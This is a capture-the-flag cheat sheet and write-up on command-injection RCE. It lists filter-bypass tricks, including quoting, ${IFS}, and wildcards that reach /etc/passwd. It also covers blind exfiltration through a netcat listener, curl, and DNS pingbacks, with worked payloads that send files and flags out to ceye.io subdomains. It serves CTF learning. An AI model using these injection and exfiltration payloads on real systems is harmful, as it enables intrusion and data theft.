# [CTF]RCE



## Bypass

### Chaining commands

```bash
|
||
;
&
&&
```

Alternatives:

```bash
%0a  #Equals to line break. The commands around this will be excuted seperately.
```

### Space

```bash
" "
```

Alternatives:

```bash
${IFS}
$IFS$1
<
>
{command,argv1,argv2}
%20
%09  #Equals to TAB. NEED PHP ENV!
```

### Blacklisted words

#### Bypass with single/double quote

```powershell
w'h'o'am'i
wh''oami

w"h"o"am"i
wh""oami
```

#### Bypass with backticks

```powershell
wh``oami
```

#### Bypass with backslash and slash

```powershell
w\ho\am\i
/\b\i\n/////s\h
```

#### Bypass with $@

`$0`: Refers to the name of the script if it's being run as a script. If you're in an interactive shell session, `$0` will typically give the name of the shell.

```powershell
who$@ami
echo whoami|$0
```


#### Bypass with $()

```powershell
who$()ami
who$(echo am)i
who`echo am`i
```

#### Bypass with variable expansion

```powershell
/???/??t /???/p??s??

test=/ehhh/hmtc/pahhh/hmsswd
cat ${test//hhh\/hm/}
cat ${test//hh??hm/}
```

#### Bypass with wildcards

```powershell
powershell C:\*\*2\n??e*d.*?  # notepad
@^p^o^w^e^r^shell c:\*\*32\c*?c.e?e  # calc
```

#### Bypass with multi-line command

```bash
who\%0aam\%0ai

# Equals to:
who\
am\
i

# Equals to:
whoami
```

## No command output

Sometimes, there is no command output in response.  So we can not ensure our commands are executed successfully in direct. So we need to use some special ways to ensure this.

### Use latency functions

```bash
sleep(5)  # This will make the response late for 5 second.
```

This will not display the command output. But we could determine whether our command are excuted successfully or not by the wait time for response.

### Use public server

> [!NOTE]
>
> You need a public IP address to perform this trick.

On your public server, you can use `netcat` to listen on some port.

```bash
nc -lp 8888  # netcat is listening on port 8888
```

And you should add `curl` in your attack commands.

```bash
curl ip:8888
```

> [!IMPORTANT]
>
> Do not forget to configure your firewall settings to allow inbound traffic on port 8888.

### Use Pingback/DNSlog

[ceye](ceye.io)

Burp Suite Collaborator

```bash
ping `whoami`.example.com
curl http://example.com.`whoami`
```

## CTF

### RCE-3

```bash
# body of POST
ip=127.0.0.1%0al\%0as

# Response
PING 127.0.0.1 (127.0.0.1): 56 data bytes
64 bytes from 127.0.0.1: seq=0 ttl=42 time=0.052 ms
--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 packets received, 0% packet loss
round-trip min/avg/max = 0.052/0.052/0.052 ms
favicon.ico
flag_ady7fgyiufo
index.php
```

Then

```bash
# body of POST
ip=127.0.0.1%0abas\%0ae64<flag_ady7fgyiufo

# Response
PING 127.0.0.1 (127.0.0.1): 56 data bytes
64 bytes from 127.0.0.1: seq=0 ttl=42 time=0.050 ms
--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 packets received, 0% packet loss
round-trip min/avg/max = 0.050/0.050/0.050 ms
WXVsaW5TZWN7V2U4JGhlTDFfMSRfMU43RVJlczcxbjlfdjJ9
```

Use base64-decode

```
YulinSec{We8$heL1_1$_1N7ERes71n9_v2}
```

### RCE-4

```bash
# body of POST
ip=127.0.0.1

# Response
ok
```

There is no echo. We can use [ceye](ceye.io) to get pingbacks.

```bash
# body of POST
ip=127.0.0.1;curl ping `ls`.ip.port.xxxxxx.ceye.io

# ceye
index.php.ip.port.xxxxxx.ceye.io
```

Check the second line of `ls`:

```bash
# body of POST
ip=127.0.0.1;curl ping `ls|sed -n '2p'`.ip.port.xxxxxx.ceye.io

# ceye
flag_jdhud3ih2a.ip.port.xxxxxx.ceye.io
```

Use `base64` to encode and return the flag.

```bash
# body of POST
ip=127.0.0.1;curl ping `base64 flag_jdhud3ih2a`.ip.port.xxxxxx.ceye.io

# ceye
WXVsaW5TZWN7QkxpbkRfSTVfYXdmdWx9.ip.port.jc4efk.ceye.io
```

Use base64-decode. Get it!

```
YulinSec{BLinD_I5_awful}
```





